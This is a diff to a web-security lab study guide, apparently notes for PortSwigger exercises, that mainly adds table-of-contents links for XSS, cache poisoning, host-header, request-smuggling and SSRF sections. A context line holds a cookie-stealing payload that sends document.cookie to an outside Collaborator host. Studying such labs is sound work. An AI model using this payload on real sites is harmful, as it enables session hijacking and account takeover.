@@ -7,14 +7,14 @@
 [Dom-XSS](#dom-based-xss)  
 [Cross Site Scripting](#cross-site-scripting)  
 [Web Cache Poison](#web-cache-poison)  
-[Host Header Poison](#host-header-poison---forgot-password)  
+[Host Headers](#host-headers)  
 [HTTP Request Smuggling](#http-request-smuggling)  
 [Brute force](#brute-force)  
   
 **[Privilege Escalation](#privilege-escalation)**  
 [JSON roleid PrivEsc](#privesc-json-roleid)  
 [CSRF Account Takeover](#csrf-account-takeover)  
-[SQLi Admin Credential Exfil](#sql-injection)  
+[SQL Injection](#sql-injection)  
 [JSON Web Tokens](#jwt)  
 [Prototype pollution](#prototype-pollution)  
 [Access Control](#access-control)  
@@ -40,6 +40,11 @@
   
 ## DOM-Based XSS  
 
+[Vulnerable AngularJS](#vuln-angularjs)  
+[Dom Invader](#dom-invader)  
+[DOM XSS JSON.parse web messages](#dom-xss-jsonparse-web-messages)  
+[Reflected DOM Cookie Stealer](#dom-cookie-stealers)  
+
 >DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. Review the code to ***identify*** the **sources** and **sinks** that may lead to exploit, list of examples:  
 
 * document.write
@@ -58,6 +63,8 @@
 * innerHTML
 * location.search
 * addEventListener  
+  
+### Vuln AngularJS  
   
 >AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is ***identified*** by noticing the search string is enclosed in an **ng-app** directive and ```/js/angular 1-7-7.js``` script. Review the HTML code to ***identify*** ng-app directive telling AngularJS that this is the root element of the AngularJS application.  
 
@@ -189,6 +196,16 @@
   
 ## Cross Site Scripting  
 
+[Tags Blocked bypass](#tags-blocked)  
+[Custom Tags not Blocked](#custom-tags-not-blocked)  
+[XSS Tags & Events](#xss-tags--events)  
+[OnHashChange](#onhashchange)  
+[Reflected String XSS](#reflected-string-xss)  
+[Reflected String Extra Escape](#reflected-string-extra-escape)  
+[XSS Template Literal](#xss-template-literal)  
+[XSS WAF Bypass](#xss-waf-bypass)  
+[Stored XSS](#stored-xss)  
+  
 >XSS Resources pages to lookup payloads for **tags** and **events**.   
 
 + [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
@@ -493,6 +510,12 @@ body:document.cookie
   
 ## Web Cache Poison  
 
+[Unkeyed header](#unkeyed-header)  
+[Utm_content](#utm_content)  
+[Poison ambiguous request](#poison-ambiguous-request)  
+
+### Unkeyed header  
+
 >Target use **tracking.js** JavaScript, and is vulnerable to **X-Forwarded-Host** or **X-Host** header redirecting path, allowing the stealing of cookie by poisoning cache.
 >***Identify*** the web cache headers in response and the tracking.js script in the page source code. Exploit the vulnerability by hosting JavaScript and injecting the header to poison the cache of the target to redirect a victim visiting.  
 
@@ -567,7 +590,10 @@ document.location='https://Collaborator.com/?CacheCookies='+document.cookie;
 
 [PortSwigger Lab: Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)  
 
-## Host Header Poison - forgot-password
+## Host Headers  
+
+[Spoof IP Address](#spoof-ip-address)  
+[HOST Connection State](#host-connection-state)  
 
 ### Spoof IP Address  
 
@@ -618,11 +644,17 @@ csrf=TheCSRFTokenValue&username=carlos
 
 [PortSwigger Lab: Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)  
 
-
 ## HTTP Request Smuggling  
 
 >Architecture with front-end and back-end server, and front-end or back-end does not support chunked encoding **(HEX)** or content-length **(Decimal)**. Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.  
-
+  
+[TE.CL multiCase - Transfer-Encoding](#tecl-multicase---transfer-encoding)  
+[CL.TE multiCase - Content-Length](#clte-multicase---content-length)  
+[CL.TE multiCase - User-Agent Cookie Stealer](#clte-multicase---user-agent-cookie-stealer)  
+[TE.CL dualchunk - Transfer-encoding obfuscated](#tecl-dualchunk---transfer-encoding-obfuscated)  
+[HTTP/2 smuggling via CRLF injection](#http2-smuggling-via-crlf-injection)  
+[HTTP/2 TE desync v10a h2path](#http2-te-desync-v10a-h2path)  
+  
 ### TE.CL multiCase - Transfer-Encoding
   
 >Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **HEXADECIMAL**, and **Content-Length** specifies the length of the message body in **bytes**. Chunks are followed by a **newline**, then followed by the chunk contents. The message is terminated with a chunk of size ZERO.  
@@ -1507,6 +1539,12 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 
 ## SSRF - Server Side Request Forgery  
 
+[Absolute GET URL + HOST SSRF](#absolute-get-url--host-ssrf)  
+[XXE + SSRF](#xxe--ssrf)  
+[HOST Routing-based SSRF](#host-routing-based-ssrf)  
+[HTML to PDF](#html-to-pdf)  
+[SSRF Open Redirection](#ssrf-open-redirection)  
+
 >SSRF attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data.  
   
 >SSRF Sample payloads.  
@@ -1631,7 +1669,7 @@ csrf=ftU8wSm4rqdQ2iuSZUwSGmDnLidhYjUg&username=carlos
 
 ### HTML to PDF  
 
->**Identify** the source code uses ```JSON.stringify``` to create html and vulnerable to SSRF attack. Partial source code for downloadReport.js.  
+>**Identify** a PDF download function and the source code uses ```JSON.stringify``` to create html on download. This HTML-to-PDF framework is vulnerable to SSRF attack. Partial source code for JavaScript on the target ```downloadReport.js```.  
 
 ```JavaScript
 function downloadReport(event, path, param) {
